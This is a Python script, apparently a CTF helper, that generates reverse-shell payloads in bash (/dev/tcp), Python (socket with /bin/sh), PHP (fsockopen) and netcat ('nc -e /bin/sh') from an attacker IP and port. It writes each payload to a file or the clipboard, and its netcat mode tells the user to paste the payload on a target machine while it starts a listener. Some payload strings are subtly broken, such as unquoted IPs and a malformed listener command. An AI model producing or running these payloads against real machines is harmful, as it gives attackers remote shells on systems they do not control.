#!/usr/bin/python3
# -*- coding: utf-8 -*-

from re import M
import sys
import os
import pyperclip
from time import sleep


def main():
    banner = """   ________               __  _____ __              __     __________________
  / ____/ /_  ___  ____ _/ /_/ ___// /_  ___  ___  / /_   / ____/_  __/ ____/
 / /   / __ \/ _ \/ __ `/ __/\__ \/ __ \/ _ \/ _ \/ __/  / /     / / / /_    
/ /___/ / / /  __/ /_/ / /_ ___/ / / / /  __/  __/ /_   / /___  / / / __/    
\____/_/ /_/\___/\__,_/\__//____/_/ /_/\___/\___/\__/   \____/ /_/ /_/       
                                                                             """
    print(banner)
    print('<------------------------------------------------------->')
    print('[*] Welcome to the Cheatsheet')
    print('[*] This tool is made to help you through the process of CTFs')
    print('[*] You can use this tool to create a reverse shell')
    print("")
    print("+--------------------------+")
    print("|[1] Create Reverse Shells |")
    print("|[2] Netcat Connection     |")
    print("+--------------------------+")
    print("<------------------------------------------------------->")
    choice = input('\n[*] Enter your choice : ')
    match choice:
        case '1':
            revershell()
        case '2':
            netcat()


def backtomain():
    print('[*] Go back to main')
    sleep(1)
    os.system('cls')
    main()


def revershell():
    os.system('cls')
    banner = """______                             _____ _          _ _ 
| ___ \                           /  ___| |        | | |
| |_/ /_____   _____ _ __ ___  ___\ `--.| |__   ___| | |
|    // _ \ \ / / _ \ '__/ __|/ _ \`--. \ '_ \ / _ \ | |
| |\ \  __/\ V /  __/ |  \__ \  __/\__/ / | | |  __/ | |
\_| \_\___| \_/ \___|_|  |___/\___\____/|_| |_|\___|_|_|    
<------------------------------------------------------->
- [1] Bash reverse_shell -
- [2] Python reverse_shell -
- [3] PHP reverse_shell -
- [4] Netcat reverse_shell - 
- [6] Exit -
<------------------------------------------------------->"""
    print(banner)
    c_rs = input('\n[*] Enter your choice : ')
    match c_rs:
        case '1':
            ip = input('[*] Enter your IP : ')
            port = input('[*] Enter your port : ')
            shell = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1"
            export = input(
                '[*] Do you want to export this shell in File or Copy on paperclip  ? (f/c) : ')
            if export == 'f':
                f = open('reverse_shell.sh', 'w')
                f.write(shell)
                f.close()
                print('[*] Shell saved in File reverse_shell.sh')
                backtomain()
            elif export == 'c':
                pyperclip.copy(shell)
                print('[*] Shell copied to clipboard')
                backtomain()

        case '2':
            ip = input('[*] Enter your IP : ')
            port = input('[*] Enter your port : ')
            shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" + ip + "," + \
                port + \
                    "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'"
            export = input(
                '[*] Do you want to export this shell in File or Copy on paperclip  ? (f/c) : ')
            if export == 'f':
                f = open('reverse_shell.py', 'w')
                f.write(shell)
                f.close()
                print('[*] Shell saved in File reverse_shell.py')
                backtomain()
            elif export == 'c':
                pyperclip.copy(shell)
                print('[*] Shell copied to clipboard')
                backtomain()

        case '3':
            ip = input('[*] Enter your IP : ')
            port = input('[*] Enter your port : ')
            shell = "php -r '$sock=fsockopen(" + ip + "," + port+");exec('/bin/sh -i <&3 >&3 2>&3');'"
            export = input(
                '[*] Do you want to export this shell in File or Copy on paperclip  ? (f/c) : ')
            if export == 'f':
                f = open('reverse_shell.php', 'w')
                f.write(shell)
                f.close()
                print('[*] Shell saved in File reverse_shell.php')
                backtomain()
            elif export == 'c':
                pyperclip.copy(shell)
                print('[*] Shell copied to clipboard')
                backtomain()

        case '4':
            ip = input('[*] Enter your IP : ')
            port = input('[*] Enter your port : ')
            shell = "nc -e /bin/sh " + ip + " " + port
            export = input(
                '[*] Do you want to export this shell in File or Copy on paperclip  ? (f/c) : ')
            if export == 'f':
                f = open('reverse_shell.sh', 'w')
                f.write(shell)
                f.close()
                print('[*] Shell saved in File reverse_shell.sh')
                backtomain()
            elif export == 'c':
                pyperclip.copy(shell)
                print('[*] Shell copied to clipboard')
                backtomain()

        case '6':
            backtomain()


def netcat():
    os.system('cls')
    banner = """
███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝  
<------------------------------------------------------->"""
    print(banner)
    ip = input('[*] Enter your IP : ')
    port = str(input('[*] Enter your port (default: 1234) : '))
    if port == '':
        port = '1234'
        print('[*] Using default port : 1234')
        print('----')
        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
        print('[!] Paste this command in the target machine')
        print('----')
        sleep(1)
        print('[*] Starting netcat reverse shell')
        sleep(1)
        print('[*] Waiting for connection')
        print('----')
        shell = "nc -lvnp " + ip + " " + port
        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
        os.system(shell)
    else:
        print('----')
        print('[!] Copying the command to clipboard : nc -e /bin/sh ' + ip + ' ' + port)
        print('[!] Paste this command in the target machine')
        print('----')
        sleep(1)
        print('[*] Starting netcat reverse shell')
        sleep(1)
        print('[*] Waiting for connection')
        print('----')
        shell = "nc -lvnp " + ip + " " + port
        pyperclip.copy('nc -e /bin/sh '+ip+' '+port)
        os.system(shell)

main()